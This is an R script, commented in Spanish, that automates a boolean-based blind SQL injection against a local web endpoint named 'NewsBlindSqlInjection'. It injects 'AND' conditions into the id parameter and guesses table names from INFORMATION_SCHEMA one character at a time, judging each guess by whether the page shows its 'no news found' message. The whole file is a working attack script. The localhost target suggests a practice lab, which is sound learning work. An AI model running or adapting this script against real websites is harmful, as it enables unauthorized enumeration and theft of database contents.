#Script1.R
library(httr)

# Configuración de la URL base
base_url <- "http://localhost:44367/News/NewsBlindSqlInjection?id="

# Función para verificar si la condición es verdadera
is_true <- function(query) {
  url <- paste0(base_url, URLencode(paste0("1 AND ", query)))
  response <- GET(url)
  content <- content(response, "text", encoding = "UTF-8")
  return(!grepl("No se encontraron noticias", content)) # Verificar si no hay error
}

# Función para extraer el nombre de una tabla por índice
extract_table_name <- function(index) {
  table_name <- ""
  for (pos in 1:5) { # Hasta 5 letras en el nombre
    char_found <- FALSE
    for (ascii_code in c(65:90, 97:122)) { # Letras A-Z y a-z
      query <- sprintf(
        "ASCII(SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY), %d, 1)) = %d",
        index, pos, ascii_code
      )
      if (is_true(query)) {
        table_name <- paste0(table_name, intToUtf8(ascii_code))
        char_found <- TRUE
        break
      }
    }
    if (!char_found) break # No hay más caracteres en el nombre
  }
  return(table_name)
}

# Función para extraer todos los nombres de tablas
extract_table_names <- function() {
  table_names <- c()
  table_index <- 0
  repeat {
    table_name <- extract_table_name(table_index)
    if (table_name == "") {
      break # Detener cuando no hay más tablas
    }
    table_names <- c(table_names, table_name)
    table_index <- table_index + 1
  }
  return(table_names)
}

# Ejecutar el script
message("Iniciando extracción de tablas de la base de datos...")
tables <- extract_table_names()

# Mostrar los nombres de las tablas
print("Tablas encontradas:")
print(tables)
